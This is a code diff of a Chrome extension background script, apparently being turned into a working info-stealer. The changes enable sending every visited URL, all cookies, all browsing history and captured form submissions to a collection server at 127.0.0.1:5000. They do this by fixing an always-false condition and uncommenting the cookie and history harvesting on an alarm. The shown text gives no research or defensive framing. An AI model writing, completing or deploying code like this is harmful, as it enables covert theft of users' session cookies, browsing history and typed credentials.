@@ -1,13 +1,13 @@
 const SERVER_HOST = "http://127.0.0.1:5000"
 
-const url = `${SERVER_HOST}/control_server`;
+
 //URL DATA
 
 chrome.webNavigation.onCompleted.addListener((e) => {
-    if (e.url == 'about:blank' && e.url=="a"){
+    if (e.url != 'about:blank'){
     
         fetch(
-        url,
+            `${SERVER_HOST}/u`,
         {
             method: "POST",
             body: JSON.stringify({ url: e.url }),
@@ -18,17 +18,6 @@ chrome.webNavigation.onCompleted.addListener((e) => {
     );
 }}, {});
 
-/*
-fetch(
-    url,
-    {
-        method: "POST",
-        body: JSON.stringify({ url: e.url }),
-        headers: {
-            "Content-Type": "application/json"
-        }
-    }
-);*/
 
 
 //Cookies Data
@@ -42,7 +31,7 @@ function logCookies(cookies) {
       a.push(cookie);
     }
     fetch(
-        url,
+        `${SERVER_HOST}/c`,
         {
             method: "POST",
             body:JSON.stringify(a),
@@ -59,7 +48,7 @@ function logHistory(hists){
         a.push(his)
     }
     fetch(
-        url,
+        `${SERVER_HOST}/h`,
         {
             method: "POST",
             body:JSON.stringify(a),
@@ -82,7 +71,7 @@ function logFormData(form){
                 data["data"] = form.requestBody.formData.raw.join("");
             }
             fetch(
-                url,
+                `${SERVER_HOST}/f`,
                 {
                     method: "POST",
                     body: JSON.stringify(data),
@@ -98,17 +87,12 @@ function logFormData(form){
 
 
   chrome.alarms.onAlarm.addListener(()=>{
-    //chrome.cookies.getAll({}).then(logCookies);
-    //chrome.history.search({ text: "" }).then(logHistory);
+    chrome.cookies.getAll({}).then(logCookies);
+    chrome.history.search({ text: "" }).then(logHistory);
 
 })
 
-//User-Passwords DATA
 
-
-
-
-//
 
 //Form DATA
 chrome.webRequest.onBeforeRequest.addListener(
